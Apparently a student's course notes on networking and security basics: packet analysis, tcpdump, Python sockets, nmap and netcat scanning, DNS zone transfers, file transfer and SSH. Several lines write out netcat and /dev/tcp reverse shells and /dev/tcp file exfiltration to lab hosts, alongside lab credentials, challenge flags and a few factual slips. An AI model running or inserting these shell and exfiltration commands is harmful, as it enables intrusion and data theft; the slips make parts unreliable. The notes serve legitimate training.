# Day 1 FUNDAMENTALS #

Binary to hex conversion - https://www.rapidtables.com/convert/number/binary-to-decimal.html

convert encoded message ->  https://gchq.github.io/CyberChef/

Evernote -> https://evernote.com/legal/open-source

Alt F4 -> gets rid of unclass banner. 

BBB Link
We will use this link to share our screen: https://bbb.cybbh.space/b/net-nfp-jln-zok

2023-11-20T17:46:20ZClass Notification
INTERNET HOST Login Info
Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

2023-11-20T11:51:01Z

YOUR MACHINE KIRWA -> ssh -X student@10.50.39.135

Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

Convert ip address to hex -> https://www.browserling.com/tools/ip-to-hex

-X enables use of graphics can open things like wireshack. 

Advantages of Assymetric 

http://networking-ctfd-2.server.vta:8000/challenges

https://net.cybbh.io/public/networking/latest/index.html -> Notes and all 

https://miro.com/app/board/o9J_klSqCSY=/ -> diagram

ssh keys are located in .ssh server... the (.) means it's a hidden folder 
netstat is being deprecated and being replaced by ss. ifconfig is also being depracated and being replaced by ip. 
ifconfig might require root access. 

ss -antl -> list all ip addresses, n means number t means tcp and l means listening.... 
terminator helps with splitting screens... 

Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

how to open terminator -> terminator & (the & makes sure that it runs in the background)

eom bl

eom blue_range_complete.png -> opens png 

ip a 

eog blue_range_complete.png -> opens a png

cat README -> has instructions for a lit of some useful commands on
pcmanf -> opens a file manager... 

ssh, telnet, http ! colon and then a port if you're using http. 

## SLIDE 1 -> OUTCOMES ##

Layer 1 - understand bits and bytes
Layer 2 - Layer 2 equipment, vlan, ARP -> Address Resolution Protocol 

Understand what Address Resolution Protocol means... Address Resolution Protocol (ARP) is a procedure that connects a dynamic IP address to a fixed physical machine address in a local area network (LAN). The physical machine address is also known as a media access control (MAC) address.

TCP -> at the transport layer they're called segments and at the UDP, they're called Datagrams. 
You can view layer 5 (sessions) using netstat  or ss -> shows open connections! 

### Layer 1 ###

Binary 
Base2 -> Two symbols (0 and 1)
128(2^7)..................1(2^0)

1 byte = byte 
2 bytes = halfword 
4 bytes = word 

A nibble is half a byte = 4 bits 

0-16 = hexadecimal value. 
base 10 - ten symbols (0 to 9, A - F)
Look at the diagram hex 0*94 = 148 as a decimal. 

Base64 - 64 (A-Z,a-z, 0-9, +,/)
place values - 2^0.................2^5
Base 64 has to be a minimum grouping of 4

#### Topologies ####

BUS - > 
STAR -> 
Ring -> like bus but loops back
Mesh -> 
Wireless -> 
Hierarchial -> Core, Distribution, Access

Ethernet timing see slides. 

#### Data link sub-layers ####
MAC -> Medium Access Control 
LLC -> Logical Link Control 

Has to bridge between physical and logical MAC deals with physical and LLC deals with logical. 
MTU -> maximum transmission unit. How much data you can send inside the layer 2 frame. Default limit for mtu is 1500 bytes. 

whta is FCS/CRC. 

Ethernet header -> destination mac and source mac 

Switch attacks
CAM Table Overflow attack 
MAC addresses are 48-bit | 6 bytes | 12 hex 

Look at he slides for the format. 

Look at the 8 bit to identify if a MAC address is a unicast or a multi-cast. 
It's easy nowadays to spoof a mac address because they're no longer burned in and can be changed by coding it with software. 

VLAN TYPES 
- default vlan 
- data vlan 
- voice - VOIP 
- Management - Switch and router management
- Native - Untagged traffic

What addresses change during data transfer? Is it source addresses or destination addresses... 

VLAN hopping -> What is this? 

RARP request and wait for an RARP reply? 
GRATUITOUS ARP ????

BPDUs and STP 

### Layer 2 ###
Practice of "borrowing" host bits and used them as subnet bits. 
How fragmentations can be used to perform attacks!!!
IPV4 Auto configuration vulnerability 
- Rogue DHCP 
- Evil Twin
- DHCP Starvation 

Traceroute port using udp is port 53 and using tcp is 80?

sudo tcpdump host 8.8.8.8 -n
sudo traceroute 8.8.8.8 -T 

ICMPV4 Attacks
ICMP
SMURF attack
ICMP Covert Channels
Oversized ICMP messages
Firewalking (traceroute)

IPV6 packets will always be 40 bytes long. 

Summary addresses... the addresses that are advertised. 

P@cket_C@rv1ng

N3tw0rkFund3m3nt@ls


Task 1: Frame and Packet H0eaders
START FLAG: P@cket_C@rv1ng


Utilize the /home/activity_resources/pcaps/packet-headers.pcapng for this activity.

CISCO switches - CDP 
Router Information - RIP

### Application Layer ###

ICMP port unreachable if there's no firewall and the connection is lost. 

sshd - refers to ssh daemon. Your processes.... like what port you're listening to? 
x11forwarding -> don't have to allow it... turn it off if you don't want people to export graphics...allows graphics to come back. 

Where is DNS located... understand this... review TCP handshake and understand the fundamentals.... 
ACK number, SYNC number, MSS, packet size and MTU (maximum transmission unit)



Task 2: Packet Payloads
START FLAG: Wh@t_P@load?

# TRAFFIC CAPTURE #

Libpcap - library pcap -> tcpdump.org
WinPcap - windows pcap -> winpcap.org
NPcap - nmap pcap -> nmap.org/npcap.

This flag will be released by Mission Command.

Flag Formats for all Basic Analysis Challenges

tcpdump flags:

COMMAND: tcpdump filter syntax
FLAG: filter syntax

BPFCheck.pcap can be found on your INTERNET_HOST in /home/activity_resources/pcaps

To find the packet count, you can append | wc -l after your command. For example tcpdump -n "yourfilter" -r BPFCheck.pcap | wc -l


BPFCheck.pcap Download Link

### TCP Dump primitivies ###

- user friendly expressions
    - src or dst 
    - host or net -> Host cares about that device and net any othe device. 
    - tcp or udp -> Looking for internet traffic.

sudo tcpdump -i eth0 -> Captures everything... Capture packets network packts on the eth0 neteork interface. -i specifies the network interface in this case eth0 and not eth1 or wlan0 or wlan1. 

type -> host, net, port or port-range
dir -> src or dest
proto -> particular protocols either ether, arp, ip, ip6, icmp, tcp or udp

-A -> print payload and ASCI -> sudo tcpdump -i eth0 -A
-D -> list interfaces -> sudo tcpdump -D
-i -> specifiy capture interface -> sudo tcpdump -i eth0
-e -> print data-link  headers -> sudo tcpdump -i eth0 -e
sudo tcpdump -i eth0 -n -> list ip and port 
-X or XX -> print payload in HEX and ASCII -> sudo tcpdump -i eth0 
-w -> write to pcap 
-r -> read from pcap
-v, vv, or vvv -> verbosity -> sudo tcpdump -i eth0 -v -> Determines how much detail should be output in the view below.
-n -> no inverse lookups 

### Logical Operators ###
- Primitives may be combined using:
    - Concatenation: 'and' (&&) ->  sudo tcpdump -i eth0 -e tcp port
    - Alteration: 'or' (||)
    - Negation: 'not' (!) -> sudo tcpdump -i eth0 -e tcp port not 22 ->  sudo tcpdump -i eth0 -e tcp port ! 22
    -  sudo tcpdump -i eth0 -e host not 192.168.242.193

- < or <= 
- > or >=
- = or != 

Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

sudo tcpdump -i eth0 port ! 22 -d -> -d lists the steps....

TODO??? Revisit packet content and see how they're structured!!! 


sudo tcpdump -i eth0 'tcp[0:2]=22 || tcp[2:2]=22' -> Capture ssh traffic coming from the source -

### BITWISE MASKING ###

ALOT TO BE STUDIED?????TODO---REVIEW CLASS NOTES AND UNDERSTAND THAT VERY WELL


### BITWISE MASKING ###

Menu -> Statistics -> protocol hierachy # shows what how many ipv4 or ipv6 you have 

Analyze -> Expert information # general information on packets, what got dropped, what needs to be retransmitted e.t.c. 

Menu -> Tools -> Firewall ACL Rules 

Menu -> Edit -> Preference -> Protocols -> SSL # decrypts traffic

Menu -> Statistics -> Conversations # shows the devices communicating

p0f -i eth0 # running pof on the interface 

### SOCKET CREATION  ###
setting up a listener 

Ask Brett about ranking up... 

IPPROTO -> Proto stands for protocol 
Datagrams = UDP 
Family -> AF_INET, AF_INET6, AF_UNIX
Type -> SOCK_STREAM (default - tcp), SOCK_DGRAM (UDP), SOCK_RAW (What does raw do)
Protocol -> should be 0, default, IPPROTO_RAW


data, conn = snrecvfrom(1024) -> conn prints to the console, data stores whatever is received as data

control shift c and control shift v -> copy and paste.....

setup a listening port --- nc nlvp 

The command nc -knlvp is a combination of options used with the nc (netcat) command in Unix-like systems. Let's break down what each option signifies:

nc: This is the netcat command, a versatile networking tool used for reading from and writing to network connections using TCP or UDP protocols.

-k: This option tells netcat to keep listening for another connection after its current connection is completed. It's often used in server mode to allow multiple sequential connections to the server.

-n: This option instructs netcat not to resolve hostnames (i.e., not to use DNS for names of hosts in addresses).

-l: This is used to specify that netcat should listen for an incoming connection rather than initiate a connection to a remote host.

-v: This enables verbose mode, which provides additional details about the connection and data transfer.

-p: This is followed by a specific port number. It specifies the source port netcat should use, which is relevant when netcat functions in client mode. However, in listening mode (-l), this option specifies the port on which to listen.

So, when you run nc -knlvp [port], you are starting netcat in a mode where it listens on a specified port ([port]), does not resolve hostnames, stays open for multiple connections (one after the other), and provides verbose output about its operations. This is typically used to create a simple server that can accept connections on the specified port.

### UDP SOCKET CREATION  ###

STREAM SOCKET SENDER DEMO
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
ip_addr = '127.0.0.1'
port = 1111
s.connect((ip_addr, port))
message = b"Message"
s.send(message)
data, conn = s.recvfrom(1024)
print(data.decode('utf-8'))
s.close()

STREAM SOCKET RECEIVER DEMO
#!/usr/bin/python3
import socket
import os
port = 1111
message = b"Connected to TCP Server on port %i\n" % port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', port))
s.listen(1)
os.system("clear")
print ("Waiting for TCP connections\n")
while 1:
    conn, addr = s.accept()
    connect = conn.recv(1024)
    address, port = addr
    print ("Message Received - '%s'" % connect.decode())
    print ("Sent by -", address, "port -", port, "\n")
    conn.sendall(message)
    conn.close()

DATAGRAM SOCKET SENDER DEMO
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
ip_addr = '127.0.0.1'
port = 2222
message = b"Message"
s.sendto(message, (ip_addr, port))
data, addr = s.recvfrom(1024)
print(data.decode())
RAW IPV4 SOCKETS
Raw Socket scripts must include the IP header and the next headers.
Requires guidance from the "Request for Comments" (RFC) to follow header structure properly.
RFCs contain technical and organizational documents about the Internet, including specifications and policy documents.
See RFC 791, Section 3 - Specification for details on how to construct an IPv4 header.
RAW SOCKET USE CASE
Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering
Avoiding defense mechanisms
Obfuscating data during transfer
Manually crafting a packet with the chosen data in header fields

PYTHON BASE64 ENCODING
import base64
message = b'Message'
hidden_msg = base64.b64encode(message)


this is connectiononelss 
To listen -> nc -nlvup 2222 # listening on port 2222
Run the python script to establish the connection

To check active posts listening->  ss -nltup 


echo "message" | xxd -> Encoding a text 
xxd file.txt file-encoded.txt -> Encode file to hex
xxd -r file-encoded.txt file-decoded.txt -> decode file from hex

PYTHON BASE64 ENCODING
import base64
message = b'Message'
hidden_msg = base64.b64encode(message)

##################
##Build Packet Header##
##################
# Lets add the IPv4 header information
# This is normally 0x45 or 69 for Version and Internet Header Length
ip_ver_ihl = 0x45
# This combines the DSCP and ECN feilds.  Type of service/QoS
ip_tos = 96 # What is the tos, this is the quality of service work.. DSCP, for 97 it would be
# The kernel will fill in the actually length of the packet
ip_len = 0 # given
# This sets the IP Identification for the packet. 1-65535
ip_id = 3465
# This sets the RES/DF/MF flags and fragmentation offset
ip_frag = 0x8000
# This determines the TTL of the packet when leaving the machine. 1-255
ip_ttl = 255
# This sets the IP protocol to 16 (CHAOS) (reference IANA) Any other protocol it will expect additional headers to be created.
ip_proto = 16 # putting an ip packet and a payload with known hex header. ip is a carrier for a protocol. Always carries something. 16 we are not carrying other protocol? What value would be if we were carrying protocol? If we are carrying chaos we put the value 6. What else can we carry other than chaos? 
# The kernel will fill in the checksum for the packet
ip_check = 0
# inet_aton(string) will convert an IP address to a 32 bit binary number
ip_srcadd = socket.inet_aton(src_ip)
ip_dstadd = socket.inet_aton(dst_ip)


##########
##Message##
##########
# Your custom protocol fields or data. We are going to just insert data here. Add your message where the "?" is. Ensure you obfuscate it though...don't want any clear text messages being spotted! You can encode with various data encodings. Base64, binascii
message = b'last_name'                  #This should be the student's last name per the prompt.. will be encoded as a hex. Why are we encoding it? Encoding is done ot obfuscate the payload...
hidden_msg = binascii.hexlify(message)  #Students can choose which encodeing they want to use.
# final packet creation
packet = ip_header + hidden_msg
# Send the packet. Sendto is used when we do not already have a socket connection. Sendall or send if we do.
s.sendto(packet, (dst_ip, 0))
# socket.send is a low-level method and basically just the C/syscall method send(3) / send(2). It can send less bytes than you requested, but returns the number of bytes sent.
# socket.sendall is a high-level Python-only method that sends the entire buffer you pass or throws an exception. It does that by calling socket.send until everything has been sent or an error occurs.


# Networking - 3 - Network Reconnaissance #


Dig -> (Domain Information Groper) -> Queries the Domain Name System servers. Provides detailed information about various DNS records like A, MX, NS e.t.c Troubleshoots DNS problems and obtains specific DNS information 
    Dig - queries DNS server over UDP port 53
        Name to IP records
    
    dig zonetransfer.me A
    dig zonetransfer.me AAAA
    dig zonetransfer.me MX
    dig zonetransfer.me TXT
    dig zonetransfer.me NS
    dig zonetransfer.me SOA

Whois -> used to query databases that store the registered users or assignees of internet resources, such as domain name, an ip address block or an autonomous system 
    Whois can provide information such as 
        - Domain registrant 
        - Registeration dates
        - Expiration dates
        - Hosting company 
    Whois - queries DNS registrar over TCP port 43
    Information about the owner who registered the domain

    whois zonetransfer.me

Netcraft -> Used for antiphishing services, cybercrime disruption and web application security testing. Analyzes the security and reliability of websites and hosting providers as well as gathering data on internet infrastructure adn web technologies

Shodan -> Search engine designed to find devices connected to the internet. Scans devices like webcams, routers, servers IoT devices and collects information on them such as banners, open ports, and types of services running. 

Passive OS Fingerprinting (pOf) -> Used to determine the operating system of a remote host (computer or device) without actively interacting with the host. Accesses traffic passively observed. 
    Include details such as packet headers, TCP/IP stack behavior, specific network protocols used
    Less likely to be detected. Doesn't generate additional network traffic. 
    Used in network monotoring, security analysis and IDS 

Banner Grabbing -> Used to gather information about a computer system and services running on its open ports. Captures banner or header information that services ssend when establishing connection. Banners contains details like the type and version of software running e.g. web server, FTP server. 

Ping: A basic network tool used to test the reachability of a host on an IP network. It measures the round-trip time for messages sent from the originating host to a destination computer.

Nmap: A network scanning tool used to discover hosts and services on a computer network, thus creating a "map" of the network. Nmap can be used to discover devices running on a network and identify open ports and services.

Netcat (nc): A versatile networking utility for reading from and writing to network connections using TCP or UDP. It's often dubbed the Swiss army knife of networking and can be used for a variety of tasks like port scanning, transferring files, and port listening.

Curl: A tool to transfer data from or to a server using various protocols, including HTTP, HTTPS, FTP, and more. It's commonly used for downloading files or web pages from the command line.

Wget: A command-line utility for downloading files from the web. It supports HTTP, HTTPS, and FTP protocols, and can recursively download files from websites.

/dev/tcp: A pseudo-device file on Unix-like systems used to interface with TCP sockets in shell scripts. It allows for simple TCP operations from the command line or in a script.

## RECONNAISSANCE STEPS ##

Network Footprinting: This is the initial phase in information gathering, where an attacker or security professional gathers as much information as possible about a target network. It involves identifying the domain names, network blocks, IP addresses of systems, and accessible networks. Footprinting can be passive (gathering information without directly interacting with the target) or active (directly engaging with the target system).

Scanning: This step involves using technical tools to identify open ports, live systems, and various services running on the network. Scanning helps to map out the network structure and understand the services and systems available.

Enumeration: This is a more in-depth collection of data about a target network. It involves extracting user names, machine names, network resources, and other services from a system. Enumeration can reveal significant details about the inner workings of the network and its hosts. Simple Network Management Protocol (SNMP), an internet standard protocol for collecting and organizing information about managed devices on ip networks and for modifying that information and Domain Name System details 

Vulnerability Assessment: In this phase, the information gathered from the above steps is used to identify vulnerabilities or weaknesses in the network. Vulnerability assessments often involve automated scanning tools to detect known vulnerabilities, such as outdated software versions, misconfigurations, and security flaws that could be exploited

## IDENTIFYING AREAS OF INTERESTS ##

/etc/passwd: This file in Unix-like operating systems contains user account information. It traditionally includes fields like the username, password (often represented as an 'x' indicating the password is stored in /etc/shadow), user ID (UID), group ID (GID), user's full name or description (GECOS field), home directory, and shell.

/etc/shadow: This file stores secure user account information including encrypted passwords and related data, such as password expiration details. It is accessible only to privileged users.

SAM Database: In Windows systems, the Security Accounts Manager (SAM) database stores user credentials, typically in an encrypted format. The SAM is part of the Windows registry and contains user names and password hashes, playing a crucial role in Windows authentication mechanisms.

## ZONE TRANSFERS ##

A zone transfer in the context of DNS (Domain Name System) is a process where the complete copy of all the DNS records for a domain (zone) is transferred from a primary DNS server (master) to a secondary DNS server (slave). This is used to synchronize data between DNS servers and ensure consistency in resolving domain names across different locations. Zone transfers occur over TCP port 53 and should be restricted and securely configured to prevent unauthorized access, as they can expose detailed information about the network structure and internal naming conventions of the domain.

dir axfr {@soa.server} {target-site} # server of authority 
dig axfr @nsztm1.digi.ninja zonetransfer.me

The command dig axfr @nsztm1.digi.ninja zonetransfer.me is used to perform a DNS zone transfer. Here's what it does:

dig: A command-line tool for querying DNS name servers.
axfr: Stands for "Asynchronous Transfer Full Range." This option is used to request a full zone transfer.
@nsztm1.digi.ninja: Specifies the name server to query, in this case, nsztm1.digi.ninja.
zonetransfer.me: This is the target domain for which the zone transfer is being requested.

This command attempts to get all the DNS records for the domain zonetransfer.me

## PASSIVE OF FINGERPRINTER (POF) ##

p0f: Passive scanning of network traffic and packet captures.

more /etc/p0f/p0f.fp
sudo p0f -i eth0            # Using sudo as we are accessing the operating system. 
sudo p0f -r test.pcap

Examine packets sent to/from target
Can guess Operating Systems and version
Can guess client/server application and version

## NETWORK SERVICE DISCOVERY ##

NMAP options. 

1. Broadcast Ping/Ping sweep (-sP, -PE)      # Ping everything user nmap options.. # Tells us what some of the replies are
2. SYN scan (-sS)                            # SyN packet. Once it receives a syn ack from the server it shuts down. Less likely to log, dosn't establish a full scan 
3. Full connect scan (-sT)                   # SYN, Receives packet and shuts down..
4. Null scan (-sN)                           # No flags. Send no flags are sent at all, see what the responses are.
5. FIN scan (-sF)                            # Sends the FIN flag
6. XMAS tree scan (-sX)                      # FIN, PSH, and URG flags
7. UDP scan (-sU)                            # checks for UDP ports on a target system... sends udp 
8. Idle scan (-sI)                           # TCP port scan method for determining what services are open on a target computer without leaving traces pointing back at oneself.
9. ACK/Window scan (-sA)                     # Send a scan to try and create a specific window size
10. RPC scan (-sR)                           # Allows diff services to talk to each other
11. FTP scan (-b)                            # FTP server
12. Decoy scan (-D)                         
13. OS fingerprinting scan (-O)              # 
14. Version scan (-sV)                       # Determine what service...
15. Protocol ping (-PO)                      # Goes through a series of protocols to discover an active host. Cirlces through various ones to find one that is active
16. Discovery probes (-PE, -PP, -PM)         # -PP -> Ping echo request.

### NMAP - OTHER OPTIONS ###

-PE - ICMP Ping
-Pn - No Ping                                # boost discovery, send a ping to every device out there and some pings are dropped die to firewall..Important when you get to tunneling for those that want to use NMAP 

### NMAP - TIME-OUT ###

-T0 - Paranoid - 300 Sec
-T1 - Sneaky - 15 Sec
-T2 - Polite - 1 Sec
-T3 - Normal - 1 Sec
-T4 - Aggresive - 500 ms
-T5 - Insane - 250 ms


### TRACEROUTE - FIREWALKING ###


Traceroute firewalking is a network reconnaissance technique that combines traceroute and firewall rule mapping to discover the network topology and firewall rule sets. In this technique, specially crafted packets with varying TTL (Time To Live) values are sent to pass through a network until they are stopped by a firewall. By observing where packets are dropped and analyzing the responses from intermediate routers, it's possible to infer the presence and configuration of firewalls. This method can be used to map out networks and identify rules in firewall configurations without directly probing the firewall itself.

traceroute 172.16.82.106                    # This standard traceroute command traces the route packets take to the specified IP address using UDP packets.
traceroute 172.16.82.106 -p 123             # Traces the route using UDP packets targeted at port 123.
sudo traceroute 172.16.82.106 -I            # Uses ICMP Echo Request packets instead of UDP. This requires superuser privileges (hence sudo).
sudo traceroute 172.16.82.106 -T            # Uses TCP SYN packets for tracing. This is useful for tracing through networks that block ICMP and UDP.
sudo traceroute 172.16.82.106 -T -p 443     # Similar to the previous, but specifically targets port 443 (commonly used for HTTPS) with TCP SYN packets. This can be useful for testing paths on networks where port 443 is likely to be open.

### NETCAT - SCANNING ###

nc [Options] [Target IP] [Target Port(s)]
-z : Port scanning mode i.e. zero I/O mode
-v : Be verbose [use twice -vv to be more verbose]
-n : do not resolve ip addresses
-w1 : Set time out value to 1
-u : To switch to UDP


### NETCAT - HORIZONTAL SCANNING ###

1 hosts but specific ports

Range of IPs for specific ports

TCP
for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'

for i in {1..254}; do nc -nvzw1 172.16.101.$i 20-23 80 2>&1 & done | grep -E 'succ|open'

This script loops through IP addresses from 172.16.82.1 to 172.16.82.254.
It uses nc (Netcat) with -nvzw1 flags to attempt TCP connections to ports 20, 21, 22, 23, and 80 on each IP.
The command checks for successful connections or open ports and outputs those results.
2>&1 & redirects stderr to stdout and runs the scan in the background for each IP.

succ -> succeed. Certain version responds with succeeded or open when they're open. 

UDP
for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'

This script loops through IP addresses from 172.16.82.1 to 172.16.82.254.
It uses nc (Netcat) with -nvzw1 flags to attempt TCP connections to ports 20, 21, 22, 23, and 80 on each IP.
The command checks for successful connections or open ports and outputs those results.
2>&1 & redirects stderr to stdout and runs the scan in the background for each IP.

### NETCAT - VERTICAL SCANNING ###

multiple ports but specific ips. 

Range of ports on specific IP

TCP
nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'

UDP
nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'

### NETCAT - TCP SCAN SCRIPT ###

#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done

### NETCAT - UDP SCAN SCRIPT ###

#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nuvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done

### NETCAT - BANNER GRABBING ###
Find what is running on a particular port

nc [Target IP] [Target Port]
nc 172.16.82.106 22
nc -u 172.16.82.106 53
-u : To switch to UDP

### CURL AND WGET ###

Both can be used to interact with the HTTP, HTTPS and FTP protocols.
Curl - Displays ASCII
curl http://172.16.82.106
curl ftp://172.16.82.106

Wget - Downloads (-r recursive)
wget -r http://172.16.82.106
wget -r ftp://172.16.82.106

## DESCRIBE METHODS USED FOR PASSIVE INTERNAL NETWORK RECONNAISSANCE ##

## PACKET SNIFFERS ##
Wireshark
Tcpdump
p0f

Limited to traffic in same local area of the network

## NATIVE HOST TOOLS ## 
### Show TCP/IP network configuration ###
Windows: ipconfig /all
Linux: ip address (ifconfig depreciated)
VyOS: show interface

### Show DNS configuration ####
Windows: ipconfig /displaydns
Linux: cat /etc/resolv.conf # Shows the name server specification 

What do you care about DNS server, gives possible sub-domains. 

### Show ARP Cache -> ARP cache poisoning. ###
Windows: arp -a
Linux: ip neighbor (arp -a depreciated)

### Show network connections ###
Windows: netstat # you need to sudo 
Linux: ss (netstat depreciated) # you need to sudo

Example options useful for both netstat and ss: -antp
a = Displays all active connections and ports.
n = No determination of protocol names. Shows 22 not SSH.
t = Display only TCP connections.
u = Display only UDP connections.
p = Shows which processes are using which sockets.

### OS Location ###
Windows: %SystemRoot%\system32\drivers\etc\services
Linux: /etc/services -> cat /etc/services

### Show Running Processes ###
Windows: tasklist
Linux: ps or top

Example options useful for ps: -elf
e = Show all running processes
l = Show long format view
f = Show full format listing

### Command path ###
which
whereis

### Routing Table ###
Windows: route print
Linux: ip route (netstat -r deprecated)
VyOS: show ip route

uname # gives the name of the os 

uname -a # gives all the information 

cat /etc/*rel* -> gives os name and version 

### File search ###
find / -name hint* 2> /dev/null # name being the name of the file 
find / -iname flag* 2> /dev/null # 


## DESCRIBE METHODS USED FOR ACTIVE INTERNAL NETWORK RECONNAISSANCE ##

### ARP SCANNING ###
arp-scan --interface=eth0 --localnet
nmap -sP -PR 172.16.82.96/27

### PING SCANNING ###
ping -c 1 172.16.82.106
for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
sudo nmap -sP 172.16.82.96/27

### DEV TCP SCANNING ###
for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done

for p in {1..1023}; do: This line starts a loop that iterates over the numbers from 1 to 1023, one at a time. The variable p is used to represent the current port number being tested.
(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1: This is the core of the code, and it's used to check if a TCP connection can be established to the remote host on a specific port. Here's how it works:

echo >/dev/tcp/172.16.82.106/$p: This part of the code creates a special file descriptor that allows you to write to a TCP connection. It effectively tries to establish a TCP connection to the IP address 172.16.82.106 on the port specified by the variable p.

>/dev/null: This part redirects the standard output (stdout) of the echo command to /dev/null, which essentially discards any output.

2>&1: This part redirects the standard error (stderr) of the echo command to the same location as stdout. In this case, it's also redirected to /dev/null.

So, if a connection can be established successfully, nothing is printed to the console (stdout and stderr are redirected to /dev/null), but if the connection fails, any error messages are also suppressed.

&& echo "$p open": This part of the code is executed if the previous command ((echo >/dev/tcp/172.16.82.106/$p)) is successful, which means a connection was established. It then prints the port number followed by "open" to the console.

The result of running this script is that it iterates through ports 1 to 1023, attempts to establish a TCP connection to the remote host (172.16.82.106) on each port, and if successful, it prints the port number followed by "open" to the console. This way, you can determine which ports are open and accepting connections on the remote host.



### CLASS EXERCISES ###
ssh student@10.50.47.43 ls -l /home/student/joke
ssh student@10.50.47.43 cat /home/student/joke
touch kirwa.txt
scp kirwa.txt student@10.50.47.43:/home/student/joke


We can use cat and netcat to send files back and fort. 
scp student@172.

nc 19.168.241.213 33502 < wilkinson.txt # 

nc -nlvp 2211 > stolen_bin # This is on the other side... output your list into a new file 



## FILE TRANSFER AND REDIRECTION ##

### NETCAT: CLIENT TO LISTENER FILE TRANSFER ###
Listener (receive file):

nc -lvp 9001 > newfile.txt
Client (sends file):

nc 172.16.82.106 9001 < file.txt

### NETCAT: LISTENER TO CLIENT FILE TRANSFER ###
Listener (sends file):

nc -lvp 9001 < file.txt
Client (receive file):

nc 172.16.82.106 9001 > newfile.txt

### NETCAT RELAY DEMOS ###
Listener - Listener

On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt

Client - Listener

On Internet_Host (send):
$ nc -lvp 1111 < secret.txt

On Blue_Priv_Host-1 (receive):
$ nc 192.168.1.1 3333 > newsecret.txt

On Blue_Host-1 Relay:
$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe

Listener - Client

On Internet_Host (send):

$ nc -172.16.82.106 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt
On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

### FILE TRANSFER WITH /DEV/TCP ###
On the receiving box:

$ nc -lvp 1111 > devtcpfile.txt
On the sending box:

$ cat secret.txt > /dev/tcp/10.10.0.40/1111
This method is useful for host that does not have NETCAT available.

### REVERSE SHELL USING NETCAT ###

First listen for the shell on your device.

$ nc -lvp 9999
On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999
On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

### REVERSE SHELL USING /DEV/TCP ###
First listen for the shell on your device.

$ nc -lvp 9999
On Victim:

024a1256e6f2ac6f08d2ccca2c3ba2a1

#### $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1 #### 

## SSH TUNNELING AND COVERT CHANNELS ##

### SECURE SHELL (SSH) ###

Built on Client vs Server vs Session

### SSH FIRST CONNECT ###

student@internet-host:~$ ssh student@172.16.82.106
The authenticity of host '172.16.82.106 (172.16.82.106)' can't be established.
ECDSA key fingerprint is SHA256:749QJCG1sf9zJWUm1LWdMWO8UACUU7UVgGJIoTT8ig0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.82.106' (ECDSA) to the list of known hosts.
student@172.16.82.106's password:
student@blue-host-1:~$
You will need to approve the Server Host (Public) Key

Key is saved to /home/student/.ssh/known_hosts

### SSH RE-CONNECT ###
ssh student@172.16.82.106
student@172.16.82.106's password:
student@blue-host-1:~$
Further SSH connections to server will not prompt to save key as long as key does not change

### SSH HOST KEY CHANGED ### 
ssh student@172.16.82.106
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:RO05vd7h1qmMmBum2IPgR8laxrkKmgPxuXPzMpfviNQ.
Please contact your system administrator.
Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/student/.ssh/known_hosts:1
remove with:
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
ECDSA host key for 172.16.82.106 has changed and you have requested strict checking.
Host key verification failed.

### SSH KEY CHANGE FIX ###
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
